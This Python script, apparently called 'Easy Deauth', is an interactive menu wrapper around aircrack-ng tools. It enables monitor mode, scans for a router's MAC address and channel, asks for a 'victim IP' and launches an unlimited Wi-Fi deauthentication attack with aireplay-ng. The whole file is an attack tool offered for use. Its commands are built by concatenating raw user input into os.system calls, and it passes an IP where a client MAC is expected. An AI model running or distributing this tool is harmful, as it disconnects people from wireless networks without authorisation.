import os
import time

def Menu():
    os.system('clear')
    print("""\033[0;36m
███████╗ █████╗ ███████╗██╗   ██╗    ██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗
██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝    ██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║
█████╗  ███████║███████╗ ╚████╔╝     ██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║
██╔══╝  ██╔══██║╚════██║  ╚██╔╝      ██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║
███████╗██║  ██║███████║   ██║       ██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝  \033[1;31mBy Toxic - Omega

\033[1;37m[\033[1;32m1\033[1;37m]\033[1;33m Monitor Mode On
\033[1;37m[\033[1;32m2\033[1;37m]\033[1;33m Monitor Mode Off
\033[1;37m[\033[1;32m3\033[1;37m]\033[1;33m Start Easy Deauth
\033[1;37m[\033[1;32m4\033[1;37m]\033[1;33m Exit 
""")
loop = True
while loop:
    Menu()
    what = input('\033[1;37m[\033[1;32m*\033[1;37m]\033[1;33m Choose an option : \033[1;34m')
    if what == "1":
        os.system('clear')
        i = input('\033[1;37m[\033[1;32m*\033[1;37m]\033[1;33m Enter your wifi interface : \033[1;34m')
        print('\033[1;33m')
        os.system('sudo airmon-ng start ' + i)
        os.system('clear')
    elif what == "2":
        os.system('clear')
        f = input('\033[1;37m[\033[1;32m*\033[1;37m]\033[1;33m Enter your wifi interface : \033[1;34m')
        print('\033[1;33m')
        os.system('sudo airmon-ng stop ' + f)
        os.system('clear')
    elif what == "3":
        os.system("clear")
        ii = input('\033[1;37m[\033[1;32m*\033[1;37m]\033[1;33m Enter your wifi interface : \033[1;34m')
        c = input('\033[1;37m[\033[1;32m*\033[1;37m]\033[1;33m Enter your monitor interface : \033[1;34m')
        os.system('xterm -geometry 85x20+100+350 -T "Copy Router MAC Address!" -hold -e airodump-ng '+c+'')
        b = input('\033[1;37m[\033[1;32m*\033[1;37m]\033[1;33m Enter your router mac : \033[1;34m')
        os.system('xterm -geometry 85x20+100+350 -T "Copy Router CHANNEL!" -hold -e airodump-ng '+c+'')
        a = input('\033[1;37m[\033[1;32m*\033[1;37m]\033[1;33m Enter your router channel : \033[1;34m')
        os.system('sudo airmon-ng stop ' + c)
        time.sleep(4)
        os.system('arp-scan --interface='+ii+' --localnet > scan.txt')
        time.sleep(4)
        os.system('sudo airmon-ng start ' + ii)
        os.system('clear')
        print('')
        os.system('python3 scan.py')
        print('')
        aa = input('\033[1;37m[\033[1;32m*\033[1;37m]\033[1;33m Enter your victim IP : \033[1;34m')
        print('')
        print('\033[0;35mDeauth Attack Launched! \033[1;31mOwO')
        print('')
        os.system('xterm -geometry 85x20+100+350 -T "Deauth Attack Started!" -hold -e aireplay-ng --deauth 0 -c '+aa+' -a '+b+' '+c+' & xterm -geometry 85x20+100+350 -T "Deauth Attack Monitor!" -hold -e airodump-ng '+c+' --bssid '+b+' --channel '+a+'')
    elif what == "4":
        os.system('clear')
        print('')
        time.sleep(2)
        print('\033[1;33mGoodbye!')
        time.sleep(2)
        print('\033[1;33mHope you have a great day!')
        time.sleep(2)
        print('\033[0;31mUwU')
        time.sleep(2)
        print('\033[1;37m')
        time.sleep(2)
        os.system('clear')
        break

